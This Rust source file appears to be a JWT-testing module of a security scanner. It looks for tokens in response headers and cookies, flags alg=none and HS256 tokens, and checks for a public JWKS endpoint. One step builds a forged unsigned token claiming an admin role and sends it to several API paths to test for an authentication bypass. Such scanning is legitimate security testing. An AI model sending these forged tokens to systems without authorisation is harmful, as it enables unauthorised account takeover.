//! JWT Attack Engine — token discovery in headers/cookies, alg:none check, JWKS probing.
//! MITRE: T1550 (Use Alternate Authentication Material).

use crate::engine_result::{print_result, EngineResult};
use serde_json::json;
use std::time::Duration;

fn make_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

fn base_url(target: &str) -> String {
    let t = target.trim().trim_end_matches('/');
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t)
    }
}

/// Returns true if the value looks like a JWT (three base64url segments).
fn looks_like_jwt(value: &str) -> bool {
    let parts: Vec<&str> = value.splitn(4, '.').collect();
    if parts.len() != 3 {
        return false;
    }
    parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '='))
}

/// Decode base64url segment (no padding required).
fn b64url_decode(s: &str) -> Option<String> {
    let padded = match s.len() % 4 {
        2 => format!("{}==", s),
        3 => format!("{}=", s),
        _ => s.to_string(),
    };
    // Simple base64url → base64 conversion then decode
    let standard = padded.replace('-', "+").replace('_', "/");
    match base64_decode(&standard) {
        Some(b) => String::from_utf8(b).ok(),
        None => None,
    }
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut lookup = [255u8; 256];
    for (i, &c) in alphabet.iter().enumerate() {
        lookup[c as usize] = i as u8;
    }
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 3 < bytes.len() {
        let a = lookup[bytes[i] as usize];
        let b = lookup[bytes[i + 1] as usize];
        let c = lookup[bytes[i + 2] as usize];
        let d = lookup[bytes[i + 3] as usize];
        if a == 255 || b == 255 || c == 255 || d == 255 {
            return None;
        }
        out.push((a << 2) | (b >> 4));
        out.push((b << 4) | (c >> 2));
        out.push((c << 6) | d);
        i += 4;
    }
    // Handle remaining
    match bytes.len() - i {
        2 => {
            let a = lookup[bytes[i] as usize];
            let b = lookup[bytes[i + 1] as usize];
            if a != 255 && b != 255 {
                out.push((a << 2) | (b >> 4));
            }
        }
        3 => {
            let a = lookup[bytes[i] as usize];
            let b = lookup[bytes[i + 1] as usize];
            let c = lookup[bytes[i + 2] as usize];
            if a != 255 && b != 255 && c != 255 {
                out.push((a << 2) | (b >> 4));
                out.push((b << 4) | (c >> 2));
            }
        }
        _ => {}
    }
    Some(out)
}

pub async fn run_jwt_attack_result(target: &str) -> EngineResult {
    let client = make_client();
    let base = base_url(target);
    let mut findings = Vec::new();

    // Step 1: GET the target and scan response headers + cookies for JWTs
    if let Ok(resp) = client.get(&base).send().await {
        let mut jwt_candidates: Vec<String> = Vec::new();

        // Check Authorization header echoes, Set-Cookie, X-Auth-Token
        for (name, value) in resp.headers().iter() {
            let val_str = value.to_str().unwrap_or("");
            let hname = name.as_str().to_lowercase();
            if hname.contains("authorization") || hname.contains("token") || hname.contains("cookie") {
                for word in val_str.split_whitespace() {
                    if looks_like_jwt(word) {
                        jwt_candidates.push(word.to_string());
                    }
                }
                // Also check bearer prefix
                if let Some(bearer) = val_str.strip_prefix("Bearer ") {
                    if looks_like_jwt(bearer.trim()) {
                        jwt_candidates.push(bearer.trim().to_string());
                    }
                }
            }
        }

        for jwt in &jwt_candidates {
            let parts: Vec<&str> = jwt.splitn(4, '.').collect();
            if parts.len() == 3 {
                if let Some(header_json) = b64url_decode(parts[0]) {
                    let alg_none = header_json.to_lowercase().contains("\"alg\":\"none\"")
                        || header_json.to_lowercase().contains("\"alg\": \"none\"");
                    let alg_hs256 = header_json.to_lowercase().contains("hs256");

                    if alg_none {
                        findings.push(json!({
                            "type": "jwt_attack",
                            "title": "JWT Algorithm: None Detected",
                            "severity": "critical",
                            "mitre_attack": "T1550",
                            "description": "A JWT token with alg=none was found in the response. This disables signature verification and allows token forgery.",
                            "value": &jwt[..jwt.len().min(40)]
                        }));
                    } else if alg_hs256 {
                        findings.push(json!({
                            "type": "jwt_attack",
                            "title": "JWT Uses Weak Algorithm (HS256)",
                            "severity": "medium",
                            "mitre_attack": "T1550",
                            "description": "HS256 JWT found. Symmetric key algorithms are susceptible to brute-force if the secret is weak.",
                            "value": &jwt[..jwt.len().min(40)]
                        }));
                    }
                }
            }
        }

        if !jwt_candidates.is_empty() {
            findings.push(json!({
                "type": "jwt_attack",
                "title": "JWT Token Exposed in Response Headers",
                "severity": "high",
                "mitre_attack": "T1550",
                "description": format!("Found {} JWT token(s) in HTTP response headers/cookies at {}", jwt_candidates.len(), base),
                "value": base.clone()
            }));
        }
    }

    // Step 2: Try sending a crafted alg=none JWT
    // Header: {"alg":"none","typ":"JWT"} Payload: {"sub":"admin","role":"admin"}
    let none_header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"; // {"alg":"none","typ":"JWT"}
    let admin_payload = "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9"; // {"sub":"admin","role":"admin"}
    let none_jwt = format!("{}.{}.", none_header, admin_payload);

    for path in &["/api/me", "/api/user", "/profile", "/api/profile", "/v1/me"] {
        let url = format!("{}{}", base, path);
        if let Ok(resp) = client
            .get(&url)
            .header("Authorization", format!("Bearer {}", none_jwt))
            .send()
            .await
        {
            if resp.status().as_u16() == 200 {
                findings.push(json!({
                    "type": "jwt_attack",
                    "title": "JWT Algorithm Confusion: alg=none Accepted",
                    "severity": "critical",
                    "mitre_attack": "T1550",
                    "description": format!("Server at {} accepted a JWT with alg=none — authentication bypass is possible.", url),
                    "value": url
                }));
                break;
            }
        }
    }

    // Step 3: Check JWKS endpoint
    let jwks_url = format!("{}/.well-known/jwks.json", base);
    if let Ok(resp) = client.get(&jwks_url).send().await {
        if resp.status().as_u16() == 200 {
            let body = resp.text().await.unwrap_or_default();
            if body.contains("\"keys\"") {
                findings.push(json!({
                    "type": "jwt_attack",
                    "title": "JWKS Endpoint Exposed",
                    "severity": "info",
                    "mitre_attack": "T1550",
                    "description": format!("JWKS endpoint is publicly accessible at {}. Ensure key rotation and that private keys are not exposed.", jwks_url),
                    "value": jwks_url
                }));
            }
        }
    }

    let message = if findings.is_empty() {
        "No JWT vulnerabilities detected".to_string()
    } else {
        format!("{} JWT issue(s) found", findings.len())
    };
    EngineResult::ok(findings, message)
}

pub async fn run_jwt_attack(target: &str) {
    print_result(run_jwt_attack_result(target).await);
}
